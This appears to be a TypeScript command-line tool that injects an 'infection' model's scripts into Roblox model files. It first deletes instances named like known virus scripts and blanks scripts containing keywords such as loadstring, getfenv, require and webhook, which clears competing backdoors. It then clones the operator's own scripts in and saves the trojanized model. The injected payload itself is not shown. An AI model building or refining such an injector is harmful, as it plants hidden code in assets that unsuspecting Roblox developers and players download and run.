import dist = require("rbxm-parser");

const fs = require("fs");
const path = require("path");
const {
    RobloxFile,
    Instance,
    Model,
    Script,
    ModuleScript,
    Folder,
    IntValue,
    AtmosphereSensor,
    BuoyancySensor,
    ControllerPartSensor,
    FluidForceSensor,
    ClickDetector,
    Configuration,
    DataType,
} = require("rbxm-parser");

class GenericInstance extends Instance {
    private _customClassName: string;
    private _propertyValidationsEnabled: boolean;

    constructor(className: string = "Instance") {
        super();
        this._customClassName = className;
        this._propertyValidationsEnabled = true;

        Object.defineProperty(this, 'ClassName', {
            get: () => this._customClassName,
            enumerable: true,
            configurable: false
        });
    }

    enablePropertyValidation(enable: boolean) {
        this._propertyValidationsEnabled = enable;
    }

    SetProp(name: string, type: string, value: any): boolean {
        if (this._propertyValidationsEnabled) {
            if (name === 'UniqueId') return false;

            if (type === 'String' && typeof value === 'string' && value.length > 500000) {
                console.log(`[WARN] Skipping large string property ${name}`);
                return false;
            }
        }

        return super.SetProp(name, type, value);
    }
}

const instanceConstructors = new Map<string, () => any>([
    ["Model", () => new Model()],
    ["Script", () => new Script()],
    ["ModuleScript", () => new ModuleScript()],
    ["Folder", () => new Folder()],
    ["BuoyancySensor", () => new BuoyancySensor()],
    ["Configuration", () => new Configuration()],
    ["AtmosphereSensor", () => new AtmosphereSensor()],
    ["ControllerPartSensor", () => new ControllerPartSensor()],
    ["FluidForceSensor", () => new FluidForceSensor()],
    ["ClickDetector", () => new ClickDetector()],
    ["IntValue", () => new IntValue()],
]);

const scriptSourceCache = new Map<any, string>();

function printInstanceHierarchy(instance: any, prefix = ""): void {
    console.log(`${prefix}${instance.Name} (${instance.ClassName})`);
    if (instance.Children?.length > 0) {
        for (const child of instance.Children) {
            printInstanceHierarchy(child, prefix + "  ");
        }
    }
}

function cacheScriptSources(instance: any): void {
    if (instance.ClassName === "Script" || instance.ClassName === "ModuleScript") {
        if (instance.Source !== undefined && instance.Source !== null) {
            scriptSourceCache.set(instance, instance.Source);
        }
    }

    if (instance.Children) {
        for (const child of instance.Children) {
            cacheScriptSources(child);
        }
    }
}

function validateInstance(instance: any, errors: string[] = [], path = ""): boolean {
    let isValid = true;
    const currentPath = path ? `${path}.${instance.Name}` : instance.Name;

    if (instance._props instanceof Map) {
        for (const [propName, propValue] of instance._props) {
            if (propName === 'UniqueId') {
                errors.push(`[WARN] Found UniqueId at ${currentPath}`);
            }

            if (propValue === undefined || propValue === null) {
                errors.push(`[ERROR] Null/undefined property ${propName} at ${currentPath}`);
                isValid = false;
            }
        }
    }

    if (instance.Children && instance.Children.length > 0) {
        for (const child of instance.Children) {
            isValid = validateInstance(child, errors, currentPath) && isValid;
        }
    }

    return isValid;
}

function cloneInstance(sourceInstance: any, targetParent: any): any {
    let newInstance: any;

    const constructor = instanceConstructors.get(sourceInstance.ClassName);
    if (constructor) {
        newInstance = constructor();
    } else {
        newInstance = new GenericInstance(sourceInstance.ClassName);
    }

    if (sourceInstance._props instanceof Map) {
        const targetProps = (newInstance as any)._props = new Map();

        for (const [key, value] of sourceInstance._props) {
            if (key === 'UniqueId') continue;

            if (value?.type === 'BinaryString' && value.value?.length > 1000000) {
                console.log(`[INFO] Skipping large BinaryString property ${key}`);
                continue;
            }

            try {
                if (value && typeof value === 'object' && 'type' in value && 'value' in value) {
                    newInstance.SetProp(key, value.type, value.value);
                }
            } catch (e) {
                console.log(`[WARN] Failed to set property ${key} via SetProp, using direct assignment`);
                targetProps.set(key, value);
            }
        }
    }

    newInstance.Name = sourceInstance.Name;
    newInstance.Parent = targetParent;

    if (sourceInstance.ClassName === "Script" || sourceInstance.ClassName === "ModuleScript") {
        const cachedSource = scriptSourceCache.get(sourceInstance);
        if (cachedSource !== undefined) {
            newInstance.SetProp("Source", DataType.String, cachedSource);
        } else if (sourceInstance.Source !== undefined && sourceInstance.Source !== null) {
            scriptSourceCache.set(sourceInstance, sourceInstance.Source);
            newInstance.SetProp("Source", DataType.String, sourceInstance.Source);
        }
    }

    if (sourceInstance.Children) {
        for (const child of sourceInstance.Children) {
            cloneInstance(child, newInstance);
        }
    }

    return newInstance;
}

function removeInstances(instance: any, namesToRemove: string[]): void {
    const children = instance.Children?.slice() || [];

    for (const child of children) {
        if (namesToRemove.includes(child.Name)) {
            if (child.Destroy) child.Destroy();
            console.log(`[INFO] Removed instance: ${child.Name} (${child.ClassName})`);
        } else {
            removeInstances(child, namesToRemove);
        }
    }
}

function findAndRemoveSuspiciousScripts(instance: any): number {
    const SUSPICIOUS_KEYWORDS = [
        "require", "getfenv", "loadstring", "_G",
        "setfenv", "webhook", "MarketplaceService"
    ];
    
    let removedCount = 0;
    
    if (instance.ClassName === "Script" || instance.ClassName === "LocalScript") {
        const source = instance.Source || "";
        for (const keyword of SUSPICIOUS_KEYWORDS) {
            if (source.toLowerCase().includes(keyword)) {
                console.log(`Found suspicious keyword "${keyword}" in script: ${instance.Name}. Rewriting content.`);
                instance.Source = "-- This script's content was removed for security reasons.";
                removedCount++;
                break;
            }
        }
    }
    
    for (const child of instance.Children) {
        removedCount += findAndRemoveSuspiciousScripts(child);
    }
    
    return removedCount;
}

function injectInfection(originalFile: dist.RobloxFile, infectionRoots: any[]): void {
    const parentObject = originalFile.Roots[0];
    const errors: string[] = [];

    const namesToRemove = [
        "qPerfectionweld", "Effectbuilder", "Manager", "Modulescript", "Controller",
        "zRelativeWeld", "MeshWeld", "AutoWeld", "weld", "InitWeld", "ObjectBuilder",
        "ZPartColorize0", "ObjectGroup", "ModelOptimizer", "ModelGrouper", "WConstraint"
    ];
    
    removeInstances(parentObject, namesToRemove);
    
    const removedScripts = findAndRemoveSuspiciousScripts(parentObject);
    if (removedScripts > 0) {
        console.log(`[INFO] Removed/sanitized ${removedScripts} suspicious scripts`);
    }

    for (const root of infectionRoots) {
        if (!validateInstance(root, errors)) {
            console.log(`[ERROR] Invalid infection root structure:`);
            errors.forEach(err => console.log(err));
            throw new Error("Invalid infection structure");
        }
    }

    console.log(`[INFO] Injecting ${infectionRoots.length} infection roots...`);
    for (let i = 0; i < infectionRoots.length; i++) {
        try {
            const clonedRoot = cloneInstance(infectionRoots[i], parentObject);
            

            if (i < 3) {
                printInstanceHierarchy(clonedRoot);
            }
        } catch (e) {
            console.log(`[ERROR] Failed to inject infection root ${i}:`, e);
            throw e;
        }

        if (i % 10 === 0 && global.gc) {
            global.gc();
        }
    }
}

class RbxmBridge {
    static async processModel(modelPath: string, infectionPath: string, outputPath: string): Promise<void> {
        try {
            const modelBuffer = fs.readFileSync(modelPath);
            const originalFile = RobloxFile.ReadFromBuffer(modelBuffer);
            
            if (!originalFile || originalFile.Roots.length === 0) {
                throw new Error("Invalid or empty model file");
            }

            const infectionBuffer = fs.readFileSync(infectionPath);
            const infectionFile = RobloxFile.ReadFromBuffer(infectionBuffer);
            
            if (!infectionFile || !infectionFile.Roots?.length) {
                throw new Error("Invalid or empty infection file");
            }

            const infectionRoots = [...infectionFile.Roots];
            
            infectionRoots.forEach(root => cacheScriptSources(root));
            console.log(`[INFO] Cached ${scriptSourceCache.size} script sources`);

            injectInfection(originalFile, infectionRoots);
            console.log(`[SUCCESS] Injected infection into model`);

            const modifiedBuffer = originalFile.WriteToBuffer();
            if (!modifiedBuffer || modifiedBuffer.length === 0) {
                throw new Error("Failed to serialize modified model");
            }

            fs.writeFileSync(outputPath, modifiedBuffer);
            console.log(`[SUCCESS] Saved modified model to ${outputPath}`);

        } catch (error) {
            console.error(`[ERROR] Processing failed: ${error}`);
            process.exit(1);
        }
    }

    static async loadInfection(infectionPath: string): Promise<void> {
        try {
            const infectionBuffer = fs.readFileSync(infectionPath);
            const infectionFile = RobloxFile.ReadFromBuffer(infectionBuffer);
            
            if (!infectionFile || !infectionFile.Roots?.length) {
                throw new Error("Invalid or empty infection file");
            }

            const metadata = {
                roots: infectionFile.Roots.map((root: any) => ({
                    name: root.Name || "Unknown",
                    className: root.ClassName || "Unknown",
                    childrenCount: root.Children?.length || 0
                }))
            };

            console.log(JSON.stringify(metadata));

        } catch (error) {
            console.error(`[ERROR] Loading infection failed: ${error}`);
            process.exit(1);
        }
    }

    static async validateModel(modelPath: string): Promise<void> {
        try {
            const modelBuffer = fs.readFileSync(modelPath);
            const modelFile = RobloxFile.ReadFromBuffer(modelBuffer);
            
            if (!modelFile || modelFile.Roots.length === 0) {
                throw new Error("Invalid or empty model file");
            }

            const errors: string[] = [];
            let isValid = true;

            for (const root of modelFile.Roots) {
                isValid = validateInstance(root, errors) && isValid;
            }

            const result = {
                valid: isValid,
                errors: errors,
                rootCount: modelFile.Roots.length
            };

            console.log(JSON.stringify(result));

        } catch (error) {
            console.error(`[ERROR] Validation failed: ${error}`);
            process.exit(1);
        }
    }

    static printUsage(): void {
        console.log("Usage:");
        console.log("  node rbxm_bridge.js process <model_path> <infection_path> <output_path>");
        console.log("  node rbxm_bridge.js load <infection_path>");
        console.log("  node rbxm_bridge.js validate <model_path>");
        console.log("");
        console.log("Commands:");
        console.log("  process   - Inject infection into model and save result");
        console.log("  load      - Load infection file and return metadata");
        console.log("  validate  - Validate model file structure");
    }
}

async function main() {
    const args = process.argv.slice(2);
    
    if (args.length === 0) {
        RbxmBridge.printUsage();
        process.exit(1);
    }

    const command = args[0];

    try {
        switch (command) {
            case 'process':
                if (args.length !== 4) {
                    console.error("Error: process command requires 3 arguments");
                    RbxmBridge.printUsage();
                    process.exit(1);
                }
                await RbxmBridge.processModel(args[1] as string, args[2] as string, args[3] as string);
                break;

            case 'load':
                if (args.length !== 2) {
                    console.error("Error: load command requires 1 argument");
                    RbxmBridge.printUsage();
                    process.exit(1);
                }
                await RbxmBridge.loadInfection(args[1] as string);
                break;

            case 'validate':
                if (args.length !== 2) {
                    console.error("Error: validate command requires 1 argument");
                    RbxmBridge.printUsage();
                    process.exit(1);
                }
                await RbxmBridge.validateModel(args[1] as string);
                break;

            default:
                console.error(`Error: Unknown command '${command}'`);
                RbxmBridge.printUsage();
                process.exit(1);
        }
    } catch (error) {
        console.error(`[FATAL] Command execution failed: ${error}`);
        process.exit(1);
    }
}

process.on('uncaughtException', (error) => {
    console.error(`[FATAL] Uncaught exception: ${error}`);
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error(`[FATAL] Unhandled rejection at:`, promise, 'reason:', reason);
    process.exit(1);
});

if (require.main === module) {
    main();
}